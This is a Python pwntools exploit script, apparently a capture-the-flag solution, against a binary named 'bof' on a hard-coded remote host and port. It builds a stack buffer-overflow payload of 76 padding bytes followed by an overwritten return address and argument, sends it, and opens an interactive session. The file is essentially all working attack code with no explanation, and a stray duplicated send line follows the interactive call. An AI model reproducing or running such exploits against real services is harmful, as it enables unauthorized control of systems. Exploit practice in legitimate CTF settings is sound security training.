#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./bof')
context.terminal = ['kitty', '-e', 'sh', '-c']

host = args.HOST or '135.181.101.92'
port = int(args.PORT or 9003)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break main
continue
'''.format(**locals())

payload = 'A'*76
#payload += p32(0xdeadbeef)
#payload += p32(0x804900e)
payload += p32(0x8049277)
payload += 'AAAA'
payload += p32(0xdeadbeef)

io = start()
io.sendline(payload)
io.interactive()




io.sendline(payload)